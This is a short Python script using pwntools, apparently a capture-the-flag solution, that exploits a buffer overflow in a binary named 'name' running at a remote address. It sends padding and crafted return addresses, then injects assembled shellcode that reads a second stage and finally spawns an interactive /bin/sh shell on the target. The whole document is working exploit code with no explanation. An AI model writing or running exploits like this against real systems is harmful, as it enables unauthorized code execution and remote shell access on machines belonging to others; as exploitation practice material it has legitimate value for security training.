#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = False

c = 0
pwn_file = "./name"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2114)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x040092a
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

c.send('/bin/sh')

# ret to shellcode
c.recvuntil('for me!')
name = p64(0x06010c0)
read_to_buf = p64(0x04008f3)
c.send(b'a' * (0x20 - 16) + name + read_to_buf)

# c.send()
c.recvuntil('You said:')
c.send(asm('xor rdi, rdi; mov dl, 0xff; mov rsi, 0x06010d0; call rbp') + b'\xeb\x10' + p64(elf.plt['read']) + p64(0x06010c0 - 16))
c.send(asm(pwnlib.shellcraft.amd64.linux.sh()))

c.interactive()
c.close()
